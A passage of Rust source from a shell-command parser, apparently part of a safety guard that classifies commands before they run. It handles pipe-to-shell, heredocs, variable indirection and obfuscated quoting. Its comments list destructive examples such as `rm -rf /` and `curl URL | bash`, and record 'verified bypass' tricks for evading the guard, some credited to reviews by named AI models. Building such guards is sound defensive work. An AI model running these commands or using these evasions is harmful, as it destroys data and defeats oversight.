            // that substitutes or re-evaluates them.
            peeled_literal.clear();
            peeled = inner;
        }
        if peeled != reading {
            if peeled.first().is_some_and(|head| {
                matches!(
                    basename(head),
                    "bash" | "sh" | "zsh" | "ksh" | "dash" | "fish"
                )
            }) {
                opaque = true;
            }
            self.extra_readings += 1;
            self.commands.push(EffectiveCommand {
                argv: peeled,
                cwd: self.cwd.clone(),
                span: SpanKind::Executed,
                wrappers: chain,
                remote: peeled_remote,
                chrooted: peeled_chrooted,
                literal: peeled_literal,
            });
        }
        self.extra_readings += 1;
        self.commands.push(EffectiveCommand {
            argv: reading.to_vec(),
            cwd: self.cwd.clone(),
            span: SpanKind::Executed,
            wrappers: wrappers.to_vec(),
            remote,
            chrooted,
            literal: literal.to_vec(),
        });
        opaque
    }

    /// Take over a command from a nested walk (a `bash -c` body, a heredoc or
    /// a pipe into a shell, an expanded command). The nested walk starts in
    /// this directory, so a command it left without one ran after a cd it
    /// could not resolve. Before, this directory was put back on it; that
    /// reading stays as an extra one, so a verdict can only get stricter.
    fn push_nested(&mut self, cmd: EffectiveCommand) {
        if cmd.cwd.is_none() && self.cwd.is_some() {
            let mut known = cmd.clone();
            known.cwd = self.cwd.clone();
            self.extra_readings += 1;
            self.commands.push(known);
        }
        self.commands.push(cmd);
    }

    /// `left && right` whose left side cannot succeed in this reading.
    fn left_of_and_fails(&self, list: Node<'_>) -> bool {
        let mut cursor = list.walk();
        let and = list.children(&mut cursor).any(|child| child.kind() == "&&");
        and && list
            .named_child(0)
            .is_some_and(|left| self.always_fails(left))
    }

    /// A failed `cd`, alone, redirected or ahead of more `&&`.
    fn always_fails(&self, node: Node<'_>) -> bool {
        match node.kind() {
            "command" => {
                node.named_child_count() == 1
                    && node
                        .child_by_field_name("name")
                        .is_some_and(|name| self.text(name) == CD_FAILED)
            }
            "redirected_statement" => node
                .child_by_field_name("body")
                .is_some_and(|body| self.always_fails(body)),
            "list" => self.left_of_and_fails(node),
            _ => false,
        }
    }

    /// Top-level walk: a `program` node has any number of child
    /// statements separated by newlines/`;`/`&`. Compound bodies inherit
    /// our cwd state, but a subshell saves/restores it.
    fn walk_program(&mut self, node: Node<'_>) {
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        for child in children {
            self.walk_node(child, &[], false, false);
        }
    }

    fn walk_node(&mut self, node: Node<'_>, wrappers: &[Wrapper], remote: bool, chrooted: bool) {
        match node.kind() {
            "command" => {
                self.handle_command(node, wrappers, remote, chrooted);
            }
            "file_redirect" => {
                self.handle_file_redirect(node, wrappers, remote, chrooted);
            }
            "for_statement"
            | "c_style_for_statement"
            | "while_statement"
            | "if_statement"
            | "case_statement"
            | "arithmetic_expansion"
            | "declaration_command"
            | "unset_command" => {
                self.push_shell_effect("__shell_unmodeled__", None, wrappers, remote, chrooted);
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
            "pipeline" => {
                self.handle_pipeline(node, wrappers, remote, chrooted);
            }
            // In a reading where a `cd` failed, `cd X && rest` runs nothing
            // after `&&`: without this, `cd build && rm -rf *` would be read
            // as `rm -rf *` where the source started.
            "list" if self.cd_fails && self.left_of_and_fails(node) => {
                if let Some(left) = node.named_child(0) {
                    self.walk_node(left, wrappers, remote, chrooted);
                }
            }
            "redirected_statement" => {
                // `bash <<EOF\nrm -rf /\nEOF` arrives as
                // redirected_statement { command, heredoc_redirect }.
                // The heredoc body is a sibling of command, NOT inside
                // it — so handle_command's child-only scan misses it.
                // Collect any sibling redirect bodies and pass them
                // into the command via a synthetic `-c BODY` injection.
                self.handle_redirected_statement(node, wrappers, remote, chrooted);
            }
            "subshell"
            | "command_substitution"
            | "process_substitution"
            | "function_definition" => {
                if node.kind() == "function_definition" {
                    self.push_shell_effect("__shell_unmodeled__", None, wrappers, remote, chrooted);
                }
                // All four create a new shell scope in real bash:
                //   * `(...)`: subshell with isolated vars + cwd.
                //   * `$(...)` / `<(...)`: command/process substitution
                //     runs in a subshell; assignments don't leak.
                //   * function bodies: assignments are global by
                //     default in bash, but they only EXECUTE on call.
                //     At parse time we don't know if `f` will ever
                //     run, and capturing the binding now poisons the
                //     outer scope. Treat the body as isolated for
                //     binding-capture purposes — pessimistic for
                //     functions that DO get called, but conservative
                //     for the more common no-call-yet case. (We also
                //     still walk children so commands inside the body
                //     surface for rule classification.)
                let saved_cwd = self.cwd.clone();
                let saved_bindings = self.bindings.clone();
                self.walk_named_children(node, wrappers, remote, chrooted);
                self.cwd = saved_cwd;
                self.bindings = saved_bindings;
            }
            "variable_assignment" => {
                // Top-level assignment (`a="rm -rf /"`) — record the
                // binding so a later `$a` in command position can be
                // resolved. Without this we leave `$a` opaque and
                // rules silently allow `a="rm /"; $a`.
                //
                // Tainted env shadow: an assignment to a TRUSTED_ENV
                // name with an opaque (refused) RHS still SHADOWS the
                // process env in real bash, so a later `$HOME` looks
                // up the new (opaque) value, not the original env.
                // Without recording a tainted sentinel, `lookup`
                // would fall through to `std::env::var(HOME)` and
                // silently use the pristine env — bypass per
                // tribunal v2 (Codex finding 4). Record `__TAINTED__`
                // so `lookup` returns None and the envelope routes
                // to the unresolved marker.
                self.walk_named_children(node, wrappers, remote, chrooted);
                let raw = self.text(node);
                if let Some((name, value)) = parse_assignment(raw) {
                    self.bindings.insert(name, value);
                } else if let Some((name, _)) = static_assignment_name(raw) {
                    if TRUSTED_ENV_NAMES.contains(&name.as_str()) {
                        self.bindings.insert(name, "__TAINTED_OPAQUE__".to_string());
                    }
                }
            }
            // Heredocs and comments are pure data — never executable.
            "heredoc_redirect" => {
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
            "comment" => {}
            // String nodes ARE data overall (their text content is not
            // executed) but they may CONTAIN command substitutions
            // (`"$(rm -rf /)"`) that DO execute before the outer
            // command. Descend into named children so substitutions
            // get walked; pure string content (string_content) has no
            // named-child structure and yields nothing.
            "string" | "raw_string" => {
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
            _ => {
                // For lists, compound statements, control flow,
                // command substitution, process substitution, and any
                // other container node, just descend into named
                // children.
                self.walk_named_children(node, wrappers, remote, chrooted);
            }
        }
    }

    /// Handle a pipeline node. Each stage is walked normally so its
    /// rules fire; additionally, when the LAST stage is a shell binary
    /// running input (no `-c`) we recognise pipe-to-shell shape:
    ///
    ///   * Upstream stage with a literal string body (`echo "rm -rf /"`,
    ///     `printf "..."`) → re-parse the literal as bash and push the
    ///     resulting commands tagged with ShC/BashC wrappers.
    ///   * Upstream stage that fetches a script (`curl URL`,
    ///     `wget URL`) → push a synthetic `__pipe_to_shell__` marker
    ///     command so the [`rule_pipe_to_shell`] predicate fires.
    fn handle_pipeline(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        // Collect stages first so we can inspect the last one before
        // we walk them in order.
        let mut cursor = node.walk();
        let stages: Vec<Node<'_>> = node.named_children(&mut cursor).collect();

        // Walk each stage normally — preserves per-stage rule firing.
        for &stage in &stages {
            self.walk_node(stage, wrappers, remote, chrooted);
        }

        // Pipe-to-shell shape detection runs AFTER walking so the
        // synthetic marker doesn't interfere with the per-stage walk.
        let Some(last) = stages.last() else { return };
        let last_argv = self.command_argv(*last);
        let last_is_shell = matches!(
            last_argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        );
        let last_has_dash_c = last_argv.iter().any(|t| t == "-c");
        if !last_is_shell || last_has_dash_c {
            return;
        }

        for &upstream in &stages[..stages.len() - 1] {
            let argv = self.command_argv(upstream);
            let head = argv.first().map(String::as_str);
            match head {
                Some("echo" | "printf") => {
                    // Re-parse each literal string arg as bash. This
                    // catches `echo "rm -rf /" | bash`.
                    for arg in &argv[1..] {
                        if !looks_like_literal(arg) {
                            continue;
                        }
                        let body = strip_outer_quotes(arg);
                        let parsed = parse_with_cwd(body, self.cwd.as_deref());
                        self.extra_readings += parsed.extra_readings;
                        for mut cmd in parsed.commands {
                            let mut chain = wrappers.to_vec();
                            chain.push(Wrapper::Shell);
                            chain.extend(cmd.wrappers);
                            cmd.wrappers = chain;
                            self.push_nested(cmd);
                        }
                    }
                }
                Some("curl" | "wget") => {
                    // Non-literal upstream — we can't see the script
                    // body. Push a synthetic marker for the predicate.
                    let url = argv
                        .iter()
                        .find(|t| t.starts_with("http://") || t.starts_with("https://"))
                        .cloned()
                        .unwrap_or_default();
                    self.commands.push(EffectiveCommand {
                        argv: vec!["__pipe_to_shell__".to_string(), url],
                        cwd: self.cwd.clone(),
                        span: SpanKind::Executed,
                        wrappers: wrappers.to_vec(),
                        remote,
                        chrooted,
                        literal: Vec::new(),
                    });
                }
                _ => {
                    // Other upstream: defer. Could be `cat file | bash`
                    // (file content unknown) or `grep ... | bash` (also
                    // unknown). Conservative behaviour: do nothing
                    // here; the per-stage walk already classified each
                    // command.
                }
            }
        }
    }

    /// Read a single `command` node's argv tokens without firing
    /// handle_command's full pipeline. Used by pipe-to-shell shape
    /// inspection where we just need to peek at argv[0].
    fn command_argv(&self, node: Node<'_>) -> Vec<String> {
        if node.kind() != "command" {
            return Vec::new();
        }
        let mut argv = Vec::new();
        let mut cursor = node.walk();
        for child in node.named_children(&mut cursor) {
            match child.kind() {
                "command_name" | "word" | "concatenation" | "number" => {
                    argv.push(self.text(child).to_string());
                }
                "string" | "raw_string" => {
                    argv.push(self.text(child).to_string());
                }
                "simple_expansion" | "expansion" => {
                    argv.push(self.text(child).to_string());
                }
                _ => {}
            }
        }
        argv
    }

    fn walk_named_children(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        for child in children {
            self.walk_node(child, wrappers, remote, chrooted);
        }
    }

    /// Resolve a textual fragment by substituting `$NAME` and `${NAME}`
    /// references against `self.bindings`. Returns `Some(expanded)` when
    /// every reference resolves; returns `None` if any reference is
    /// missing, dynamic (`$(...)`, `` `...` ``), parametric
    /// (`${NAME:-default}`), or positional (`$1`, `$@`, `$$`). The None
    /// case is what flips an indirect command to the
    /// `__indirect_unresolved__` marker — silent expansion of an unknown
    /// var is the bypass we are closing.
    fn expand_vars(&self, text: &str) -> Option<String> {
        let mut out = String::new();
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            // Backtick command substitution is dynamic at any position.
            // Without this guard the envelope's re-parse loop sees the
            // same backtick text on the next iteration and recurses
            // until the stack overflows. (Verified: `\`rm -rf /\``
            // would hang with stack overflow before this branch.)
            if c == '`' {
                return None;
            }
            if c != '$' {
                out.push(c);
                continue;
            }
            // Bare `$` at end of string — leave literal.
            let Some(&next) = chars.peek() else {
                out.push('$');
                continue;
            };
            // `$(cmd)` and backticks are dynamic — refuse.
            if next == '(' || next == '`' {
                return None;
            }
            // `${NAME}` — only plain names; refuse parameter expansion ops.
            if next == '{' {
                chars.next();
                let mut name = String::new();
                let mut closed = false;
                for ch in chars.by_ref() {
                    if ch == '}' {
                        closed = true;
                        break;
                    }
                    if ch == '_' || ch.is_ascii_alphanumeric() {
                        name.push(ch);
                    } else {
                        return None;
                    }
                }
                if !closed || name.is_empty() {
                    return None;
                }
                let value = self.lookup(&name)?;
                out.push_str(&value);
                continue;
            }
            // `$NAME` — alphanum/underscore, leading non-digit.
            if next == '_' || next.is_ascii_alphabetic() {
                let mut name = String::new();
                while let Some(&ch) = chars.peek() {
                    if ch == '_' || ch.is_ascii_alphanumeric() {
                        name.push(ch);
                        chars.next();
                    } else {
                        break;
                    }
                }
                let value = self.lookup(&name)?;
                out.push_str(&value);
                continue;
            }
            // `$1`, `$@`, `$?`, `$$`, `$*`, `$#` — positional/special params.
            // We don't track them; treat as unresolvable.
            return None;
        }
        Some(out)
    }

    /// Process `bash <<EOF…EOF` and friends. Tree-sitter wraps the
    fn push_shell_effect(
        &mut self,
        kind: &str,
        target: Option<String>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut argv = vec![kind.to_owned()];
        // A target comes only from a redirect destination that passed
        // literal_node and split into one shell word; zsh expands `=name`.
        let mut literal = vec![false];
        literal.extend(target.as_deref().map(|t| !t.starts_with('=')));
        argv.extend(target);
        self.commands.push(EffectiveCommand {
            argv,
            cwd: self.cwd.clone(),
            span: SpanKind::Executed,
            wrappers: wrappers.to_vec(),
            remote,
            chrooted,
            literal,
        });
    }

    fn handle_file_redirect(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        self.walk_named_children(node, wrappers, remote, chrooted);
        let mut cursor = node.walk();
        let output = node
            .children(&mut cursor)
            .find_map(|child| match child.kind() {
                ">" | ">>" | ">|" | "&>" | "&>>" => Some(false),
                ">&" => Some(true),
                _ => None,
            });
        let Some(duplication_or_output) = output else {
            return;
        };
        let mut cursor = node.walk();
        let destination = node
            .children_by_field_name("destination", &mut cursor)
            .next();
        let Some(destination) = destination else {
            self.push_shell_effect("__shell_output__", None, wrappers, remote, chrooted);
            return;
        };
        let raw = self.text(destination);
        if duplication_or_output && (raw == "-" || raw.bytes().all(|b| b.is_ascii_digit())) {
            return;
        }
        // A word glued to the destination (`> '/dir/'\name`) is part of the
        // file name the shell opens, which tree-sitter puts elsewhere.
        let mut inner = node.walk();
        let glued = node
            .children(&mut inner)
            .any(|child| child.start_byte() == destination.end_byte())
            || destination.end_byte() == node.end_byte()
                && node
                    .next_sibling()
                    .is_some_and(|next| next.start_byte() == node.end_byte());
        let target = (literal_node(destination, self.src) && !glued)
            .then(|| shell_words::split(raw).ok())
            .flatten()
            .filter(|words| words.len() == 1)
            .and_then(|mut words| words.pop());
        let target_literal = decoded_literal(destination, self.src);
        self.push_shell_effect("__shell_output__", target, wrappers, remote, chrooted);
        // The target is the text the shell writes to only when every part
        // of it is literal (not `"$~X"` in zsh).
        if let Some(command) = self.commands.last_mut() {
            if command.argv.len() == 2 {
                command.literal[1] = target_literal && command.literal[1];
            }
        }
    }

    /// command + redirect pair as `redirected_statement` with the
    /// command and one or more redirect nodes as siblings. If the
    /// inner command's head is a shell and there is a heredoc body,
    /// process_substitution, or here-string body attached, we re-route
    /// the work as if the body were a `-c BODY` argument so the
    /// existing wrapper logic handles bindings, expansion, and the
    /// indirect-unresolved marker uniformly.
    fn handle_redirected_statement(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut cursor = node.walk();
        let kids: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        let command = kids.iter().find(|c| c.kind() == "command").copied();
        let Some(cmd_node) = command else {
            // Not a recognizable shape — fall back to walking children.
            self.walk_named_children(node, wrappers, remote, chrooted);
            return;
        };
        for &effect in kids
            .iter()
            .filter(|n| matches!(n.kind(), "file_redirect" | "heredoc_redirect"))
        {
            self.walk_node(effect, wrappers, remote, chrooted);
        }
        // Determine the command head — needed to decide if we should
        // splice a synthetic `-c body`. Cheap argv peek via command_argv.
        let head_argv = self.command_argv(cmd_node);
        let is_shell = matches!(
            head_argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        );
        if !is_shell || head_argv.iter().any(|t| t == "-c") {
            // Either not a shell, or already has -c — handle the
            // command normally. The sibling redirects are I/O that
            // doesn't change classification semantics for non-shell
            // commands (`grep < file`).
            self.handle_command(cmd_node, wrappers, remote, chrooted);
            return;
        }
        // Look for a script-providing redirect.
        let mut script: Option<String> = None;
        for k in &kids {
            match k.kind() {
                "heredoc_redirect" => {
                    let mut cur = k.walk();
                    let mut body = String::new();
                    for inner in k.named_children(&mut cur) {
                        if inner.kind() == "heredoc_body" {
                            body.push_str(self.text(inner));
                        }
                    }
                    if !body.is_empty() {
                        script = Some(body);
                    } else {
                        script = Some("$__heredoc_unknown__".to_string());
                    }
                }
                "herestring_redirect" => {
                    let mut cur = k.walk();
                    let mut children = k.named_children(&mut cur);
                    if let Some(inner) = children.next() {
                        script = Some(unquote(self.text(inner)));
                    }
                }
                "process_substitution" => {
                    script = Some("$__procsub_unknown__".to_string());
                }
                _ => {}
            }
        }
        if let Some(body) = script {
            // Synthesize an argv `bash -c BODY` and route it through
            // the same path as a literal `bash -c …` invocation.
            // We can't mutate the tree-sitter node, so build a fake
            // EffectiveCommand stream by directly invoking the wrapper
            // re-parse logic via a synthetic call. Cheapest path:
            // re-parse `bash -c '...body...'` as a fresh source.
            // The body might contain quotes; we route the bytes
            // through expand_vars first to preserve bindings.
            let body_to_parse = self.expand_vars(&body).unwrap_or_else(|| {
                // Body has unresolved expansion — emit marker directly.
                self.commands.push(EffectiveCommand {
                    argv: vec![
                        "__indirect_unresolved__".to_string(),
                        format!("shell stdin: {body}"),
                    ],
                    cwd: self.cwd.clone(),
                    span: SpanKind::Executed,
                    wrappers: wrappers.to_vec(),
                    remote,
                    chrooted,
                    literal: Vec::new(),
                });
                String::new()
            });
            if !body_to_parse.is_empty() {
                let parsed = parse_with_cwd(&body_to_parse, self.cwd.as_deref());
                if parsed.had_error {
                    self.push_shell_effect("__shell_unmodeled__", None, wrappers, remote, chrooted);
                }
                // Carry the nested count up, so an enclosing re-parse does
                // not take these extra readings for commands it found.
                self.extra_readings += parsed.extra_readings;
                let inner = parsed.commands;
                for mut cmd in inner {
                    let mut chain = wrappers.to_vec();
                    chain.push(Wrapper::Shell);
                    chain.extend(cmd.wrappers);
                    cmd.wrappers = chain;
                    cmd.remote = cmd.remote || remote;
                    cmd.chrooted = cmd.chrooted || chrooted;
                    self.push_nested(cmd);
                }
            }
            return;
        }
        // No script-providing redirect; classify the command normally.
        self.handle_command(cmd_node, wrappers, remote, chrooted);
    }

    fn handle_command(
        &mut self,
        node: Node<'_>,
        wrappers: &[Wrapper],
        remote: bool,
        chrooted: bool,
    ) {
        let mut argv: Vec<String> = Vec::new();
        let mut cursor = node.walk();
        let children: Vec<Node<'_>> = node.named_children(&mut cursor).collect();
        // First pass: walk any nested command/process substitutions so
        // their inner commands surface as separate executable nodes.
        // `echo $(rm -rf /etc)` and `echo "$(rm -rf /etc)"` both
        // contain a destructive `rm` that runs before the outer echo
        // and must therefore be classified independently.
        for child in &children {
            match child.kind() {
                "file_redirect" => self.handle_file_redirect(*child, wrappers, remote, chrooted),
                // `$(( $(rm -rf /) ))` and `${X:-$(rm -rf /)}` run the
                // substitution inside them too.
                "command_substitution"
                | "process_substitution"
                | "variable_assignment"
                | "arithmetic_expansion"
                | "expansion" => {
                    self.walk_named_children(*child, wrappers, remote, chrooted);
                }
                "string" | "raw_string" | "concatenation" => {
                    // Substitutions can nest inside string content
                    // (`"$(rm -rf /)"`) or in concatenated tokens
                    // (`pre$(rm)post`). Descend to surface them.
                    self.walk_named_children(*child, wrappers, remote, chrooted);
                }
                _ => {}
            }
        }
        // Second pass: collect argv tokens for the outer command.
        //
        // `reading` is the same argv with quoted parts decoded: the program
        // a quoted name runs (`'r'm` → `rm`) and the ANSI-C arguments that
        // argv drops (`rm $'-rf' $'/'`). argv itself is built exactly as
        // before; when the two differ, the decoded reading is classified as
        // an extra command, so a verdict can only get stricter. A part that
        // cannot be decoded sets `opaque`, which adds an indirect marker: a
        // non-approvable, indeterminate block.
        let mut reading: Vec<String> = Vec::new();
        // The same reading as zsh expands `=rm` in it.
        let mut equals: Vec<String> = Vec::new();
        // One flag per word of argv, of the reading and of the zsh reading:
        // see [`EffectiveCommand::literal`].
        let mut literal: Vec<bool> = Vec::new();
        let mut reading_literal: Vec<bool> = Vec::new();
        let mut equals_literal: Vec<bool> = Vec::new();
        let mut opaque = false;
        // Where the last argument part ends, which argv word it gave (if
        // any), and whether it gave the readings one.
        let mut previous_end: Option<usize> = None;
        let mut previous_argv: Option<usize> = None;
        let mut previous_in_reading = false;
        // A part that reached neither argv nor the readings (`$(( ))`).
        let mut dropped_part = false;
        // Operands of a cd as the shell sees them, ANSI-C ones included.
        let mut operands = 0usize;
        let mut operands_end = false;
        for child in &children {
            let before = argv.len();
            let reading_before = reading.len();
            let equals_before = equals.len();
            let child_reading = decoded_reading(*child, self.src);
            let same = matches!(child_reading, Reading::Same);
            match child_reading {
                Reading::Same => {}
                Reading::Decoded(word) => {
                    let fixed = decoded_literal(*child, self.src);
                    reading.push(word);
                    reading_literal.push(fixed);
                }
                Reading::Opaque => opaque = true,
            }
            match child.kind() {
                "command_name" | "word" | "concatenation" | "number" => {
                    // decode_token handles ANSI-C `$'X'` and unquoted
                    // backslash escapes so the rules layer sees the
                    // bash-literal head, not the obfuscated source
                    // text (`$'rm'` and `\r\m` both → `rm`).
                    argv.push(decode_token(self.text(*child)));
                }
                "string" | "raw_string" => {
                    // Strip outer quotes; tree-sitter keeps them in
                    // the source text, so `'foo'` and `"foo"` both
                    // arrive with the surrounding marks.
                    argv.push(unquote(self.text(*child)));
                }
                "variable_assignment" => {
                    // Skip leading env-vars for command-name lookup;
                    // record nothing (real shells set them in env).
                }
                "simple_expansion" | "expansion" => {
                    argv.push(self.text(*child).to_string());
                }
                "command_substitution" => {
                    // `$(echo rm) -rf /` — substitution as command head
                    // surfaces here. We push the raw text so the
                    // envelope (`contains_var_ref`) sees `$(`. The
                    // first pass already walked the substitution
                    // children to surface the inner command separately.
                    argv.push(self.text(*child).to_string());
                }
                "process_substitution" => {
                    // `source <(...)`, `cmd >(...)` — push raw text so
                    // the source/eval wrappers can see the indirect
                    // argument and emit the marker. The first-pass
                    // walk into command_substitution doesn't apply
                    // here (process_substitution children are NOT
                    // command_substitution), but since this only
                    // matters for source/. — which we treat as
                    // wholly indirect anyway — we don't need to
                    // surface the inner command separately.
                    argv.push(self.text(*child).to_string());
                }
                _ => {}
            }
            let child_literal = literal_value(*child, self.src);
            literal.extend(std::iter::repeat_n(child_literal, argv.len() - before));
            // Parts that need no decoding read the same in both.
            if same {
                reading.extend(argv[before..].iter().cloned());
                reading_literal.extend_from_slice(&literal[before..]);
            }
            match zsh_equals(*child, self.src) {
                // zsh puts the program's path there, not this word.
                Some(program) => {
                    equals.push(program);
                    equals_literal.push(false);
                }
                None => {
                    equals.extend(reading[reading_before..].iter().cloned());
                    equals_literal.extend_from_slice(&reading_literal[reading_before..]);
                }
            }
            // tree-sitter splits some single shell words in two, such as a
            // quote glued to a word with a backslash (`'--'\output=x` or
            // `$'--'\output=x` is `--output=x`). The readings get the one
            // word the shell passes; argv's halves are then not literal. A
            // part starting with a blank is not glued: tree-sitter only put
            // it there (a newline before `\cmd` on the next line).
            let part = !matches!(
                child.kind(),
                "command_name"
                    | "file_redirect"
                    | "herestring_redirect"
                    | "heredoc_redirect"
                    | "variable_assignment"
                    | "comment"
            );
            let starts_blank = self.text(*child).starts_with(char::is_whitespace);
            if part {
                let gave_argv = argv.len() > before;
                let gave_reading = reading.len() > reading_before;
                if !gave_argv && !gave_reading {
                    dropped_part = true;
                }
                if starts_blank {
                    operands_end = true;
                } else if !operands_end {
                    operands += 1;
                }
                if previous_end == Some(child.start_byte()) && !starts_blank {
                    literal[before..].fill(false);
                    if let Some(index) = previous_argv {
                        literal[index] = false;
                    }
                    if previous_in_reading && gave_reading {
                        merge_glued(&mut reading, &mut reading_literal, reading_before);
                        merge_glued(&mut equals, &mut equals_literal, equals_before);
                    } else {
                        opaque = true;
                    }
                }
                previous_end = Some(child.end_byte());
                previous_argv = gave_argv.then(|| argv.len() - 1);
                previous_in_reading = reading.len() > reading_before;
            }
        }
        opaque |= self.push_reading(
            &argv,
            &reading,
            &reading_literal,
            wrappers,
            remote,
            chrooted,
        );
        // A separate reading, so that `=echo 'policy dir'/x` keeps what the
        // decoded reading alone gives it (an unknown program writing there).
        if equals != reading {
            opaque |=
                self.push_reading(&argv, &equals, &equals_literal, wrappers, remote, chrooted);
        }
        if opaque {
            // An extra command like the decoded reading: it must not count
            // as something a re-parse found, or a wrapper's own fallback
            // (lockdown egress, a protected operand) is dropped.
            self.extra_readings += 1;
            self.commands.push(EffectiveCommand {
                argv: vec!["__indirect_unresolved__".to_string(), argv.join(" ")],
                cwd: self.cwd.clone(),
                span: SpanKind::Executed,
                wrappers: wrappers.to_vec(),
                remote,
                chrooted,
                literal: Vec::new(),
            });
        }

        // Shell stdin/script-input detection: `bash <<< BODY`,
        // `bash <<EOF…EOF`, `bash <(cmd)`, and `bash -s <<EOF…` all
        // feed BODY to the shell as its script. Without routing,
        // these slip past as a no-op argv = ["bash"]. Tree-sitter
        // exposes them as `herestring_redirect`, `heredoc_redirect`,
        // and `process_substitution` siblings of the command.
        //
        // Strategy:
        //   * here-string with literal/expansion body → synth `-c body`
        //     so the existing bash -c path expands and re-parses.
        //   * here-doc body or process substitution → opaque from our
        //     vantage point; emit __indirect_unresolved__ via the
        //     wrapper-unwrap path (synth a `-c` with a sentinel
        //     placeholder that contains_var_ref always trips on, so
        //     expand_vars returns None and the marker fires).
        if matches!(
            argv.first().map(String::as_str),
            Some("bash" | "sh" | "zsh" | "ksh" | "dash")
        ) && !argv.iter().any(|t| t == "-c")
        {
            let mut script_input: Option<String> = None;
            for child in &children {
                match child.kind() {
                    "herestring_redirect" => {
                        let mut cur = child.walk();
                        let mut children = child.named_children(&mut cur);
                        if let Some(inner) = children.next() {
                            script_input = Some(unquote(self.text(inner)));
                        }
                    }
                    "heredoc_redirect" => {
                        // Heredoc body content is in a sibling
                        // `heredoc_body` node attached to the redirect.
                        // Tree-sitter places the body as a NAMED child
                        // of the heredoc_redirect; grab whatever text
                        // is there. If we can't find a literal body,
                        // route through the indirect-unresolved path
                        // (sentinel `$__heredoc__`) so the marker
                        // fires uniformly.
                        let mut cur = child.walk();
                        let mut body = String::new();
                        for inner in child.named_children(&mut cur) {
                            if inner.kind() == "heredoc_body" {
                                body.push_str(self.text(inner));
                            }
                        }
                        if !body.is_empty() {
                            script_input = Some(body);
                        } else {
                            script_input = Some("$__heredoc_unknown__".to_string());
                        }
                    }
                    "process_substitution" => {
                        // bash <(...) — the substitution's stdout is
                        // a /dev/fd path that bash executes as a
                        // script. We can't inspect that script
                        // statically. Route through indirect-unresolved.
                        script_input = Some("$__procsub_unknown__".to_string());
                    }
                    _ => {}
                }
            }
            if let Some(body) = script_input {
                argv.push("-c".to_string());
                argv.push(body);
                literal.extend([false, false]);
            }
        }

        if argv.is_empty() || self.cd_fails && argv[0] == CD_FAILED {
            return;
        }

        // Built-in mutators: `read VAR…` and `printf -v VAR …` set
        // bindings dynamically from stdin/format. We can't see the
        // new value, but if a NAME was previously bound to a literal
        // (e.g. `a="ls"`) and then `read a` overrides it from stdin,
        // a later `$a` MUST NOT resolve via the stale safe value.
        // Tribunal v2 (Gemini finding 5). Clear the bindings.
        if argv[0] == "read" {
            for arg in &argv[1..] {
                if !arg.starts_with('-') && is_valid_var_name(arg) {
                    self.bindings.remove(arg);
                }
            }
        } else if argv[0] == "printf" {
            let mut iter = argv[1..].iter();
            while let Some(t) = iter.next() {
                if t == "-v" {
                    if let Some(name) = iter.next() {
                        if is_valid_var_name(name) {
                            self.bindings.remove(name);
                        }
                    }
                    break;
                }
            }
        }

        // Indirect command via variable expansion (`$a`, `${a}`).
        // Without this branch, `a="rm -rf /"; $a` leaves argv[0]="$a"
        // and rules silently allow it — verified bypass. With known
        // binding: textually expand the whole argv and re-parse so
        // bash word-splitting kicks in (`$a` unquoted with value
        // "rm -rf /" → 3 argv tokens). With unknown binding: emit a
        // synthetic `__indirect_unresolved__` marker so a rule fires
        // — guard semantics prefer false-positive ask over silent
        // allow on opaque indirection (matches the existing
        // `__eval_dynamic__` pattern for `eval "$X"`).
        if contains_var_ref(&argv[0]) {
            let joined = argv.join(" ");
            match self.expand_vars(&joined) {
                Some(expanded) if expanded != joined => {
                    let parsed = parse_with_cwd(&expanded, self.cwd.as_deref());
                    if parsed.had_error {
                        self.push_shell_effect(
                            "__shell_unmodeled__",
                            None,
                            wrappers,
                            remote,
                            chrooted,
                        );
                    }
                    // Extra decoded readings are classified but are not a
                    // command the walk found: with nothing else, the marker
                    // below must still be emitted.
                    let found = parsed.commands.len() > parsed.extra_readings;
                    self.extra_readings += parsed.extra_readings;
                    let inner = parsed.commands;
                    if !inner.is_empty() {
                        for mut cmd in inner {
                            // The shell splits and globs an unquoted
                            // expansion; this re-parse of its text does not,
                            // so no word of it is known to be literal.
                            cmd.literal.clear();
                            let mut chain = wrappers.to_vec();
                            chain.extend(cmd.wrappers);
                            cmd.wrappers = chain;
                            cmd.remote = cmd.remote || remote;
                            cmd.chrooted = cmd.chrooted || chrooted;
                            self.push_nested(cmd);
                        }
                        if found {
                            return;
                        }
                    }
                    // Expansion produced no parseable command (empty
                    // value, whitespace only) — fall through to the
                    // unresolved-marker path so we don't silently drop.
                }
                Some(_) | None => {
                    // Either no resolution happened (text unchanged —
                    // would loop on re-parse) or some reference was
                    // unresolvable. Fall through to marker emission.
                }
            }
            self.commands.push(EffectiveCommand {
                argv: vec!["__indirect_unresolved__".to_string(), joined],
                cwd: self.cwd.clone(),
                span: SpanKind::Executed,
                wrappers: wrappers.to_vec(),
                remote,
                chrooted,
                literal: Vec::new(),
            });
            return;
        }

        // `cd <abs>` updates lexical cwd; emit nothing for cd itself.
        // Any non-absolute target (`cd ..`, `cd subdir`, `cd -`, `cd ~`,
        // `cd $VAR`, bare `cd`) drops cwd to None — we cannot resolve
        // the new directory at parse time and a stale cwd causes false
        // safe verdicts (verified bypass: `cd /tmp; cd ..; rm -rf var`
        // checks against /tmp/var rather than /var).
        if argv[0] == "cd" {
            match argv.get(1).map(String::as_str) {
                // A target that expands (`/tmp/$X`, `/tmp/"$~X"`) is not the
                // text argv holds.
                // zsh's `cd OLD NEW` substitutes in $PWD: one target only.
                Some(target)
                    if operands == 1
                        && !dropped_part
                        && target.starts_with('/')
